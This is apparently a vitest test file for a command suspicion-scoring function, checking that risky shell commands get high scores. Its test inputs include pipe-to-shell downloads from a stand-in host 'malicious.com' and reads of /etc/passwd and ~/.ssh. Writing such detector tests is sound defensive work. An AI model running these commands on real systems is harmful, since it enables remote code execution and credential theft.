import { describe, it, expect } from 'vitest';
import { calculateSuspicionScore } from '../src/lib/suspicion.ts';

describe('calculateSuspicionScore', () => {
  it('should return 0 for empty or safe commands', () => {
    expect(calculateSuspicionScore('')).toBe(0);
    expect(calculateSuspicionScore('echo "hello"')).toBe(0);
  });

  it('should detect shell execution (High Risk)', () => {
    expect(calculateSuspicionScore('curl http://malicious.com | bash')).toBeGreaterThanOrEqual(15);
    expect(calculateSuspicionScore('wget http://malicious.com -O- | sh')).toBeGreaterThanOrEqual(15);
  });

  it('should detect downloads', () => {
    expect(calculateSuspicionScore('curl http://example.com/script.sh')).toBeGreaterThanOrEqual(8);
  });

  it('should detect IP addresses', () => {
    expect(calculateSuspicionScore('ping 1.2.3.4')).toBeGreaterThanOrEqual(8 + 2);
  });

  it('should detect information gathering', () => {
    expect(calculateSuspicionScore('env')).toBeGreaterThanOrEqual(5);
    expect(calculateSuspicionScore('whoami')).toBeGreaterThanOrEqual(2);
  });

  it('should detect sensitive file access', () => {
    expect(calculateSuspicionScore('cat /etc/passwd')).toBeGreaterThanOrEqual(10);
    expect(calculateSuspicionScore('ls ~/.ssh/')).toBeGreaterThanOrEqual(10);
  });
});
